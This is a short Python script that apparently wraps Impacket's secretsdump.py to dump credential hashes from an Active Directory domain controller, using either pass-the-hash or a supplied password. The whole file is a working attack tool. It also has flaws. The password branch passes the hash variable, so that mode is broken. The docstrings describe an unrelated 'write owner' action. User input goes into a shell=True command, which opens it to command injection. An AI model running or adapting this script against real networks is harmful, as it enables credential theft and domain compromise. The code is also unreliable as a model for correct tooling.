import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def DCHash(DOMAIN, USER, HASH):
    """Write owner over group with hashes"""
    tar = input(f"{CYAN}Domain Controller IP:{RED} {RESET}")
    subprocess.call([f"secretsdump.py {DOMAIN}/{USER}@{tar} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    
def DCPass(DOMAIN, USER, PASS):
    """Write owner over group with password"""
    tar = input(f"{CYAN}Domain Controller IP:{RED} {RESET} ")
    subprocess.call([f"secretsdump.py {DOMAIN}/{USER}:{PASS}@{tar}"], shell=True)

def main():
    # Get the arguments from the argument_parser.py
    args = parse_arguments()

    # Extract arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    HASH = args.PassTheHash  

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        DCHash(DOMAIN, USER, HASH)
    else:
        DCPass(DOMAIN, USER, HASH)

if __name__ == '__main__':
    main()
